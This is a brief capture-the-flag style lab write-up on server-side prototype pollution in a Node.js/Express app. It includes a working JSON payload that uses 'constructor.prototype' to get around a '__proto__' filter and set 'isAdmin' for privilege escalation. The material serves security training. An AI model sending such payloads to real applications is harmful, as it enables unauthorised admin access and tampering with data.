# Practitioner Lab 155 : Bypassing flawed input filters for server-side prototype pollution

---

This lab is built on Node.js and the Express framework. It is vulnerable to server-side prototype pollution because it unsafely merges user-controllable input into a server-side JavaScript object.

To solve the lab:

1. Find a prototype pollution source that you can use to add arbitrary properties to the global `Object.prototype`.
2. Identify a gadget property that you can use to escalate your privileges.
3. Access the admin panel and delete the user `carlos`.

You can log in to your own account with the following credentials: `wiener:peter`

```
{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"IChEZQtNTVWEUMQDEAKYo2Pd5dKhptL8",
    "constructor": {
      "prototype": {
        "isAdmin": true
 }
}
 } 
```

I attempted to use the __ proto __ but it showed no output as a result I ended up doing the payload above which worked.